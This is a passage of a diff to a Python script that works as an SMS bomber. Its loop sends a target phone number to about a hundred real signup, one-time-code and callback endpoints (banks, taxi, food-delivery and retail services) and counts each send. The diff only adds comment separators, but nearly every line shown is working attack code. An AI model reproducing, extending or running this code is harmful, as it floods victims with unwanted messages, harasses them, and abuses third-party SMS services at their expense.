                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://zoloto585.ru/api/bcard/reg/",
@@ -3604,7 +3611,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
@@ -3617,7 +3624,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12",
@@ -3630,7 +3637,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
@@ -3643,7 +3650,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
@@ -3656,7 +3663,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.flipkart.com/api/5/user/otp/generate",
@@ -3673,7 +3680,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.flipkart.com/api/6/user/signup/status",
@@ -3690,7 +3697,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://bamper.by/registration/?step=1",
@@ -3707,7 +3714,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://friendsclub.ru/assets/components/pl/connector.php",
@@ -3720,7 +3727,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
@@ -3733,7 +3740,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app.doma.uchi.ru/api/v1/parent/signup_start",
@@ -3751,7 +3758,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app.doma.uchi.ru/api/v1/parent/signup_start",
@@ -3769,7 +3776,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.icq.com/smsreg/requestPhoneValidation.php",
@@ -3789,7 +3796,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://shafa.ua/api/v3/graphiql",
@@ -3806,7 +3813,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
@@ -3825,7 +3832,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://uklon.com.ua/api/v1/account/code/send",
@@ -3839,7 +3846,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://crm.getmancar.com.ua/api/veryfyaccount",
@@ -3857,7 +3864,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post("https://auth.multiplex.ua/login", json={"login": _phone})
                 kk = kk + 1
@@ -3867,7 +3874,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -3884,7 +3891,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://secure.ubki.ua/b2_api_xml/ubki/auth",
@@ -3909,7 +3916,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.top-shop.ru/login/loginByPhone/",
@@ -3922,7 +3929,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/",
@@ -3935,7 +3942,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://osava.ua/users/sign-up/callbacks",
@@ -3948,7 +3955,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://eda.yandex/api/v1/user/request_authentication_code",
@@ -3961,7 +3968,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://izi.ua/api/auth/register",
@@ -3978,7 +3985,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone}
@@ -3990,7 +3997,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.pozichka.ua/v1/registration/send",
@@ -4003,7 +4010,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ontaxi.com.ua/api/v2/web/client",
@@ -4016,7 +4023,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://suandshi.ru/mobile_api/register_mobile_user",
@@ -4029,7 +4036,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",
@@ -4042,7 +4049,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",
@@ -4055,7 +4062,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.moyo.ua/identity/registration",
@@ -4068,7 +4075,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://belkacar.ru/get-confirmation-code",
@@ -4083,7 +4090,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://starpizzacafe.com/mods/a.function.php",
@@ -4096,7 +4103,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
@@ -4110,7 +4117,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app.karusel.ru/api/v1/phone/",
@@ -4124,7 +4131,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.tinkoff.ru/v1/sign_up",
@@ -4138,7 +4145,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://dostavista.ru/backend/send-verification-sms",
@@ -4151,7 +4158,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.monobank.com.ua/api/mobapplink/send",
@@ -4164,7 +4171,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}",
@@ -4177,7 +4184,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post("https://alfalife.cc/auth.php", data={"phone": _phone})
                 kk = kk + 1
@@ -4187,7 +4194,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://koronapay.com/transfers/online/api/users/otps",
@@ -4200,7 +4207,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://btfair.site/api/user/phone/code",
@@ -4213,7 +4220,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ggbet.ru/api/auth/register-with-phone",
@@ -4232,7 +4239,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.etm.ru/cat/runprog.html",
@@ -4250,7 +4257,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://thehive.pro/auth/signup", json={"phone": "+" + _phone,}
@@ -4262,7 +4269,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.mtstv.ru/v1/users", json={"msisdn": _phone}, headers={}
@@ -4274,7 +4281,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://account.my.games/signup_send_sms/", data={"phone": _phone}
@@ -4286,7 +4293,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://zoloto585.ru/api/bcard/reg/",
@@ -4308,7 +4315,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post("https://kasta.ua/api/v2/login/", data={"phone": _phone})
                 kk = kk + 1
@@ -4318,7 +4325,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://cloud.mail.ru/api/v2/notify/applink",
@@ -4337,7 +4344,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.creditter.ru/confirm/sms/send",
@@ -4350,7 +4357,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",
@@ -4377,7 +4384,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://win.1admiralxxx.ru/api/en/register.json",
@@ -4398,7 +4405,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://oauth.av.ru/check-phone",
@@ -4411,7 +4418,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
@@ -4424,7 +4431,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://city24.ua/personalaccount/account/registration",
@@ -4437,7 +4444,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://client-api.sushi-master.ru/api/v1/auth/init",
@@ -4450,7 +4457,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post("https://auth.multiplex.ua/login", json={"login": _phone})
                 kk = kk + 1
@@ -4460,7 +4467,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.niyama.ru/ajax/sendSMS.php",
@@ -4477,7 +4484,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}
@@ -4489,7 +4496,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.easypay.ua/api/auth/register",
@@ -4502,7 +4509,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://fix-price.ru/ajax/register_phone_code.php",
@@ -4519,7 +4526,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.nl.ua",
@@ -4538,7 +4545,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://msk.tele2.ru/api/validation/number/" + _phone,
@@ -4551,7 +4558,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://www.finam.ru/api/smslocker/sendcode",
@@ -4564,7 +4571,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://makimaki.ru/system/callback.php",
@@ -4580,7 +4587,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.flipkart.com/api/6/user/signup/status",
@@ -4597,7 +4604,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://secure.online.ua/ajax/check_phone/",
@@ -4610,7 +4617,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://cabinet.planetakino.ua/service/sms",
@@ -4623,7 +4630,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ontaxi.com.ua/api/v2/web/client",
@@ -4636,7 +4643,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
@@ -4649,7 +4656,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://smart.space/api/users/request_confirmation_code/",
@@ -4662,7 +4669,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
@@ -4675,7 +4682,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.tarantino-family.com/wp-admin/admin-ajax.php",
@@ -4693,7 +4700,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://apteka.ru/_action/auth/getForm/",
@@ -4718,7 +4725,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://uklon.com.ua/api/v1/account/code/send",
@@ -4732,7 +4739,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
@@ -4745,7 +4752,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://requests.service.banki.ru/form/960/submit",
@@ -4765,7 +4772,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.ivi.ru/mobileapi/user/register/phone/v6",
@@ -4778,7 +4785,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.moyo.ua/identity/registration",
@@ -4791,7 +4798,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://helsi.me/api/healthy/accounts/login",
@@ -4804,7 +4811,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.kinoland.com.ua/api/v1/service/send-sms",
@@ -4818,6 +4825,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://pizzahut.ru/account/password-reset",
@@ -4835,7 +4843,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.rabota.ru/remind", data={"credential": _phone}
@@ -4847,7 +4855,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://rutube.ru/api/accounts/sendpass/phone",
@@ -4860,7 +4868,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.citilink.ru/registration/confirm/phone/+"
@@ -4874,7 +4882,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php",
@@ -4887,7 +4895,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://www.oyorooms.com/api/pwa/generateotp?phone="
@@ -4901,7 +4909,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
@@ -4919,7 +4927,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://newnext.ru/graphql",
@@ -4945,7 +4953,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.sunlight.net/v3/customers/authorization/",
@@ -4958,7 +4966,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/",
@@ -4976,7 +4984,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://lk.invitro.ru/lk2/lka/patient/refreshCode",
@@ -4989,7 +4997,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://online.sbis.ru/reg/service/",
@@ -5008,7 +5016,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ib.psbank.ru/api/authentication/extendedClientAuthRequest",
@@ -5033,7 +5041,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
@@ -5046,7 +5054,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}
@@ -5058,7 +5066,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
@@ -5071,7 +5079,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}
@@ -5083,7 +5091,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
@@ -5096,7 +5104,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.delitime.ru/api/v2/signup",
@@ -5109,7 +5117,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://findclone.ru/register", params={"phone": "+" + _phone}
@@ -5121,7 +5129,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://guru.taxi/api/v1/driver/session/verify",
@@ -5134,7 +5142,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://www.icq.com/smsreg/requestPhoneValidation.php",
@@ -5154,7 +5162,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -5176,7 +5184,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -5193,7 +5201,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
@@ -5206,7 +5214,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api.ivi.ru/mobileapi/user/register/phone/v6",
@@ -5219,7 +5227,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-		
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://api-rest.logistictech.ru/api/v1.1/clients/request-code",
@@ -5233,7 +5241,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://pizzasinizza.ru/api/phoneCode.php",
@@ -5246,7 +5254,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-		
+#------------------------------------------------------------------------------#
             try:
                 requests.get(
                     "https://vezitaxi.com/api/employment/getsmscode",
@@ -5263,7 +5271,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-		
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://app.benzuber.ru/login",
@@ -5276,7 +5284,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-		
+#------------------------------------------------------------------------------#
             try:
                 requests.post(
                     "https://3040.com.ua/taxi-ordering",
@@ -5289,7 +5297,7 @@ class cloop(object):
                 time.sleep(0.2)
             except:
                 print(f"{r}Не отправлено :({rs}")
-		
+#------------------------------------------------------------------------------#
             kolvo = kolvo + 1
             if kolvo == kolvos:
                 print(
